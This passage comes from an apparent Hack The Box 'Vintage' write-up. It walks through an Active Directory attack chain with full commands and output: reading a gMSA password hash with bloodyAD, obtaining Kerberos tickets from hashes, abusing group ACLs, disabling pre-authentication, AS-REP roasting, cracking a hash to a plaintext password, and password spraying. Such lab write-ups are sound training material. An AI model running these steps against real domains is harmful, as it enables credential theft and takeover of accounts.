+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in FS01$.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>FS01<span class=se>\$</span>.ccache 
+</span></span></code></pre></td></tr></table></div></div><p>Now i will use <code>bloodyAD</code> to retrieve the <code>msDS-ManagedPassword</code> attribute that contains the GMSA01$ password&rsquo;s NTLM hash.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k get object <span class=s1>&#39;GMSA01$&#39;</span> --attr msDS-ManagedPassword
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>gMSA01,CN<span class=o>=</span>Managed Service Accounts,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
+</span></span><span class=line><span class=cl>msDS-ManagedPassword.B64ENCODED: qNZ+qlGD+Cx17DM27SffmeF+2eftJRLCsHfxsLxSzhh2dERzgKmiJzvEHrfEAqstlS64r4Y1OQdu8sdCT6b8+gYXpLDa8xBQIFyshNK7YPrERV3rJVALnhITHE4lKIYoagI4Dr9owAMBGo7ZC4LOoBGk90mk4uuIMHNtylVRWva41F+v2TFCzSNfKnBSVuLhiZ+koEMTCkgP3Z+4Xnnluw6qkD3WPsnsYDlYYizOGPhsUwB1GJyzFHawe4iwfVnbWQdouCgflR27treFO5W0R5RqcRhkwEYLomOobFVUa3kGh1iQNdpaJLPI6Uo4767UM1O/sSaeML8nKVKhwsDolA<span class=o>==</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once again i will try get the TGT of the <code>GMSA01$</code> using its NTLM hash and export it to the <code>KRB5CCNAME</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getTGT.py vintage.htb/<span class=s1>&#39;gmsa01$&#39;</span> -hashes :51434c5b357ff89c5f85d994a27f7339 -dc-ip dc01.vintage.htb
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in gmsa01$.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>gmsa01<span class=se>\$</span>.ccache 
+</span></span></code></pre></td></tr></table></div></div><p>I got back to <code>Bloodhound</code> and it turned out that <code>GMSA01$</code> have <code>GenericWrite</code> and <code>AddSelf</code> ACL on the <code>SERVICEMANAGERS</code> Group.</p><p><img src=/p/vintage-htb-writeup/Bloodhound4.png width=707 height=263 srcset="/p/vintage-htb-writeup/Bloodhound4_hu_8c0ba9c7c30b8ee8.png 480w, /p/vintage-htb-writeup/Bloodhound4_hu_1fa761033b34a8b.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=268 data-flex-basis=645px></p><p>This <code>Servicemanagers</code> group have <code>GenericWrite</code> on these 3 service accounts as it seems (<code>svc_ark</code>, <code>svc_ldap</code> and <code>svc_sql</code>)</p><p><img src=/p/vintage-htb-writeup/Bloodhound5.png width=688 height=493 srcset="/p/vintage-htb-writeup/Bloodhound5_hu_2f0802d9eaea187c.png 480w, /p/vintage-htb-writeup/Bloodhound5_hu_dd29659cd0b8a492.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=139 data-flex-basis=334px></p><p>So i added the <code>GMSA01$</code> user account to this group by leveraging the <code>AddSelf</code> right using <code>bloodyAD</code> again.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k add groupMember <span class=s2>&#34;SERVICEMANAGERS&#34;</span> <span class=s2>&#34;P.Rosa&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> P.Rosa added to <span class=nv>CN</span><span class=o>=</span>SERVICEMANAGERS,OU<span class=o>=</span>PRE-MIGRATION,DC<span class=o>=</span>VINTAGE,DC<span class=o>=</span>HTB
+</span></span></code></pre></td></tr></table></div></div><p>Since i have <code>GenericAll</code> on these accounts i tried to <code>DONT_REQ_PREAUTH</code> to their <code>userAccountControl</code> attributes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> <span class=o>[</span><span class=s1>&#39;DONT_REQ_PREAUTH&#39;</span><span class=o>]</span> property flags added to SVC_ARK<span class=s1>&#39;s userAccountControl
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage]
+</span></span></span><span class=line><span class=cl><span class=s1>└─$ bloodyAD --host dc01.vintage.htb -d &#34;VINTAGE.HTB&#34; --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
+</span></span></span><span class=line><span class=cl><span class=s1>[-] [&#39;</span>DONT_REQ_PREAUTH<span class=s1>&#39;] property flags added to SVC_SQL&#39;</span>s userAccountControl
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> <span class=o>[</span><span class=s1>&#39;DONT_REQ_PREAUTH&#39;</span><span class=o>]</span> property flags added to SVC_LDAP<span class=err>&#39;</span>s userAccountControl
+</span></span></code></pre></td></tr></table></div></div><p>I used <code>GetNPUsers.py</code> to ASREPROAST these account but we got hashes except for the <code>svc_sql</code> which is weird.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span> + datetime.timedelta<span class=o>(</span><span class=nv>days</span><span class=o>=</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User Administrator doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class=line><span class=cl><span class=s1>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User DC01$ doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User gMSA01$ doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User FS01$ doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User M.Rossi doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User R.Verdi doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User L.Bianchi doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User G.Viola doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User C.Neri doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User P.Rosa doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class=o>(</span>Clients credentials have been revoked<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_ldap</span>@VINTAGE.HTB:8935004afc9c3df69eb0a5bc47621d8b<span class=nv>$e5eebf50edc698bd3f5e5c09d2775d050799b52e8831a0208d336223e0b74c9955a7857b1abe5688acdc44499e6ef32de5dddb38d60fb2d326bc6e4f65068f2f6c1ba6667359aad9a39dd7e02c2acb8609437143bae142fbdc64bf91f0140be899a0f38a7440c926769fbfabc7827ded393e143106b6a18731eb9456b7a3e41ac4b8865012fc70206a7a73ef0216d1452bfe45bbdc348a1fc26e733e7f8626599981edcba9f57e2c69b084d8a8a6955c2bd552a0f7b2479f3b11c93138bed924d0202fcb76dd7d9fa2f56e6295db55ce1f545f1195985aae0eb7e1b3197f03e68bc825017568e5ef6a23</span>
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_ark</span>@VINTAGE.HTB:aaa9f68a14fd7e389d65ffa9be7f6a5e<span class=nv>$ebe016f470e83e0976cdca9250bf63015b67b4c8aafef4dd15c302f69fbb68cd47623cb559ce38ad202993edca154960e7f6ec8a28be9506502ad1e8f3b4df9996ac41db60fa02442adcf07b5483d0b068ef4beb983fa0f9b0a059bd884be6c6b409ea070a5e605e096ec88f8e9efeeb8f6434ce9df9d27c4deca383a4c688a7a8e8c916c32c8901057a3204d2e75b8117676bf35de1324d8442d3cd801613056d940f3e1eed4fb7c8c085d16a60e42e7d6496fec559e5e530eaa898da11c158144dcc524de67c9bd511c600a01f04801910be17c5620eec9bfd80208b3bd4009cc00e87601a71532af9</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User C.Neri_adm doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User L.Bianchi_adm doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span></code></pre></td></tr></table></div></div><p>I checked the <code>userAccountControl</code> of all account and it seems that the <code>svc_sql</code> is disabled as it have <code>ACCOUNTDISABLE</code> .</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host <span class=s2>&#34;dc01.vintage.htb&#34;</span> -d <span class=s2>&#34;vintage.htb&#34;</span> --kerberos --dc-ip 10.10.11.45 -k get search  --filter <span class=s2>&#34;(objectClass=user)&#34;</span> --attr userAccountControl
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;SNIP&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>svc_sql,OU<span class=o>=</span>Pre-Migration,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>userAccountControl: ACCOUNTDISABLE<span class=p>;</span> NORMAL_ACCOUNT<span class=p>;</span> DONT_EXPIRE_PASSWORD<span class=p>;</span> DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>svc_ldap,OU<span class=o>=</span>Pre-Migration,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>userAccountControl: NORMAL_ACCOUNT<span class=p>;</span> DONT_EXPIRE_PASSWORD<span class=p>;</span> DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>svc_ark,OU<span class=o>=</span>Pre-Migration,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>userAccountControl: NORMAL_ACCOUNT<span class=p>;</span> DONT_EXPIRE_PASSWORD<span class=p>;</span> DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>C.Neri_adm,CN<span class=o>=</span>Users,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>userAccountControl: NORMAL_ACCOUNT<span class=p>;</span> DONT_EXPIRE_PASSWORD
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>L.Bianchi_adm,CN<span class=o>=</span>Users,DC<span class=o>=</span>vintage,DC<span class=o>=</span>htb
+</span></span><span class=line><span class=cl>userAccountControl: NORMAL_ACCOUNT<span class=p>;</span> DONT_EXPIRE_PASSWORD                              
+</span></span></code></pre></td></tr></table></div></div><p>So i enabled it using <code>bloodyAD</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> <span class=o>[</span><span class=s1>&#39;ACCOUNTDISABLE&#39;</span><span class=o>]</span> property flags removed from SVC_SQL<span class=err>&#39;</span>s userAccountControl
+</span></span></code></pre></td></tr></table></div></div><p>I retried again and it succeed this time !</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/                                                                              
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span> + datetime.timedelta<span class=o>(</span><span class=nv>days</span><span class=o>=</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User Administrator doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class=line><span class=cl><span class=s1>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User DC01$ doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User gMSA01$ doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User FS01$ doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User M.Rossi doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User R.Verdi doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User L.Bianchi doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User G.Viola doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User C.Neri doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User P.Rosa doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_sql</span>@VINTAGE.HTB:e9d5b32940352f3bf4114333d1930da0<span class=nv>$29</span>a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_ldap</span>@VINTAGE.HTB:90958306658dd10b4c019c56ef39fe1e<span class=nv>$ce6a47b7f4337142af32290cd30a37be714d54c6d956bd9af3254e361a222a844be5985b55295f3cdbb2a9e245fd7d1b80e18fcd4d09dc0c4393a7d664a6d6d9cfc8ea51b24163cb60f372bf7f71c4cea2d73f5df40fff74ea106e0e0cd2cd23e59ca884b61c2a42e69a364752020e5575a0a60274850921bc8e731c1324fb6e07b32e1b3fabed928521599f749694b69bbae00d9e703140c329be90c73c457cf98fc0e128a969308227857aacc8f361c3e40ba519c4018c855cf8f734005d4e8a5ab0e94d3c265e390258d40ec80bb3848ea31cd13fa8069ee25f893bbcf353a90b8aba75d6bcf9d24c</span>
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_ark</span>@VINTAGE.HTB:b95d1f54813715a9fc875f1940d5cab6<span class=nv>$ca10e91db21c4dea427b67a1226434ea1797350c9e0c7067940526248caca9b64ed9739cbdc059946da19f040ba43654166dc0d474b9d3beeb4ba56de6c457d5c53dcb2464a360b87770ec3c4de29495725c481836dd6c56fda373080cfe41eb56ef895091799ea02759feb49066ef4259672cb913c383ef6ae96b45d65c6109b9c60c89589b450d6b645f97088d99ecc7bee735173b120099188b07ca410e7f27c7871b33c5684a7f565bb03dfea7e3794d572a1e874ab82dc40726ad999a5fa0a65aae731e6f13af160e14c74c3d1a6f6ce5d75eb4ad537f7f82301bc9e687b80407ec023c9f9d5df4</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User C.Neri_adm doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class=line><span class=cl><span class=s1>[-] User L.Bianchi_adm doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
+</span></span></code></pre></td></tr></table></div></div><p>I tried cracking these hashes using <code>hashcat</code> but only <code>svc_sql</code> end up being crackable and the password is <code>Zer0the0ne</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>hashcat</span><span class=p>-</span><span class=mf>6.2</span><span class=p>.</span><span class=mf>6</span><span class=p>&gt;</span><span class=n>hashcat</span><span class=p>.</span><span class=py>exe</span> <span class=n>-m</span> <span class=mf>18200</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>razio</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>hash</span><span class=p>.</span><span class=py>txt</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=n>SNIP</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Dictionary</span> <span class=n>cache</span> <span class=n>hit</span><span class=err>:</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Filename</span><span class=p>..</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>razio</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>rockyou</span><span class=p>.</span><span class=py>txt</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Passwords</span><span class=p>.</span><span class=err>:</span> <span class=mf>14344385</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Bytes</span><span class=p>.....</span><span class=err>:</span> <span class=mf>139921507</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Keyspace</span><span class=p>..</span><span class=err>:</span> <span class=mf>14344385</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$svc_sql@VINTAGE</span><span class=p>.</span><span class=n>HTB</span><span class=err>:</span><span class=n>e9d5b32940352f3bf4114333d1930da0</span><span class=nv>$29a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7</span><span class=err>:</span><span class=n>Zer0the0ne</span>
+</span></span></code></pre></td></tr></table></div></div><p>As always, once getting a new password i perform a password spraying using <code>kerbrute</code> on the rest of the accounts and check for password reuse. And it seems that <code>C.Neri</code> has the same password.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
